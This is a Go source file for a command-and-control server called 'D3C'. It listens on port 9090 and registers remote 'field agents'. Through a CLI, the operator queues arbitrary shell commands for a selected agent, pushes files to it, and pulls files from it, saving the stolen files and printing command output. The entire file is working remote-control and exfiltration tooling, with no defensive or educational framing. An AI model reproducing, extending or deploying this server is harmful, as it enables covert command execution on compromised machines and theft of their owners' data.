package main

import (
	"bufio"
	"commons/commons/helpers"
	"commons/commons/structures"
	commons "commons/commons/structures"
	"encoding/gob"
	"io/ioutil"
	"log"
	"net"
	"os"
)

var (
	fieldAgents   = []commons.Message{}
	selectedAgent = ""
)

func main() {
	log.Println("Started Execution")
	go startListener("9090") // Start listener on port 9090 dettached from main thread

	cliHandler()
}

func cliHandler() {
	for {
		if selectedAgent != "" {
			print(selectedAgent + "@D3C# ")
		} else {
			print("D3C> ")
		}

		reader := bufio.NewReader(os.Stdin)
		completeCommand, _ := reader.ReadString('\n')

		separatedCommand := helpers.SeparateCommand(completeCommand)
		baseCommand := separatedCommand[0]

		if len(baseCommand) > 0 {
			switch baseCommand {
			case "show":
				showHandler(separatedCommand)
			case "select":
				selectHandler(separatedCommand)
			case "send":
				if len(separatedCommand) > 1 && selectedAgent != "" {
					var err error
					// Send file to selected agent
					fileToSend := &structures.File{}
					fileToSend.FileName = separatedCommand[1]
					fileToSend.FileData, err = os.ReadFile(fileToSend.FileName)

					sendCommand := &structures.Commands{}
					sendCommand.Command = separatedCommand[0]
					sendCommand.File = *fileToSend
					if err != nil {
						log.Println("Error reading file: ", err)
					} else {
						fieldAgents[fieldAgentPosition(selectedAgent)].Commands = append(fieldAgents[fieldAgentPosition(selectedAgent)].Commands, *sendCommand)

					}

				} else {
					log.Println("Specify the file to send")
				}
			case "get":
				if len(separatedCommand) > 1 && selectedAgent != "" {
					// Send get command to selected agent
					getCommand := &structures.Commands{}
					getCommand.Command = completeCommand

					fieldAgents[fieldAgentPosition(selectedAgent)].Commands = append(fieldAgents[fieldAgentPosition(selectedAgent)].Commands, *getCommand)
				} else {
					log.Println("Specify the file to get")
				}
			default:
				if selectedAgent != "" {
					// Send command to selected agent
					command := &commons.Commands{}
					command.Command = completeCommand

					for index, agent := range fieldAgents {
						if agent.AgentId == selectedAgent {
							// Send cli command to agent
							fieldAgents[index].Commands = append(fieldAgents[index].Commands, *command)
						}
					}
				} else {
					log.Println("Typed command does not exist!")
				}
			}
		}
	}
}

func showHandler(command []string) {
	if len(command) > 1 {
		switch command[1] {
		case "agents":
			for _, agent := range fieldAgents {
				println("Agent: " + agent.AgentId + "->" + agent.AgentHostname + "@" + agent.AgentCWD)
			}
		default:
			log.Println("Selected option does not exist!")
		}

	}
}

func selectHandler(command []string) {
	if len(command) > 1 {
		if agentIsRegistered(command[1]) {
			selectedAgent = command[1]
		} else {
			log.Println("Agent not registered")
			log.Println("To list field agents use the command: show agents")
		}
	} else {
		selectedAgent = ""
	}
}

func agentIsRegistered(agentId string) (registered bool) {
	registered = false

	for _, agent := range fieldAgents {
		if agent.AgentId == agentId {
			registered = true
			break
		}
	}
	return registered
}

func messageContainsResponse(message commons.Message) (containsResponse bool) {
	containsResponse = false

	for _, command := range message.Commands {
		if len(command.Response) > 0 {
			containsResponse = true
			break
		}
	}
	return containsResponse
}

func fieldAgentPosition(agentId string) (position int) {
	position = -1

	for index, agent := range fieldAgents {
		if agent.AgentId == agentId {
			position = index
			break
		}
	}
	return position
}

func saveFile(file structures.File) {
	err := ioutil.WriteFile(file.FileName, file.FileData, 0644)

	if err != nil {
		log.Println("Error saving file: ", err)
	}
}

func startListener(port string) {
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatalf("Error starting listener: %v", err)
	} else {
		for {
			channel, err := listener.Accept()
			defer channel.Close()

			if err != nil {
				log.Fatalf("Error accepting connection: %v", err)
			} else {
				message := &commons.Message{}

				gob.NewDecoder(channel).Decode(message)

				// Verify if the agent is already registered
				if agentIsRegistered(message.AgentId) {
					if messageContainsResponse(*message) {
						log.Println("Response from host: ", message.AgentHostname)
						// Print the response
						for index, command := range message.Commands {
							log.Println("Response from command: ", command.Command)
							println(command.Response)
							if helpers.SeparateCommand(command.Command)[0] == "get" &&
								message.Commands[index].File.Error == false &&
								len(message.Commands[index].File.FileData) > 0 {
								saveFile(message.Commands[index].File)
							}
						}
					}
					// Send queued commands to agent
					gob.NewEncoder(channel).Encode(fieldAgents[fieldAgentPosition(message.AgentId)])
					// Clear the agent queued commands
					fieldAgents[fieldAgentPosition(message.AgentId)].Commands = []structures.Commands{}
				} else {
					log.Println("New connection: ", channel.RemoteAddr())
					log.Println("Registering Agent: ", message.AgentId)
					fieldAgents = append(fieldAgents, *message)
					gob.NewEncoder(channel).Encode(message)
				}

			}

		}

	}
}
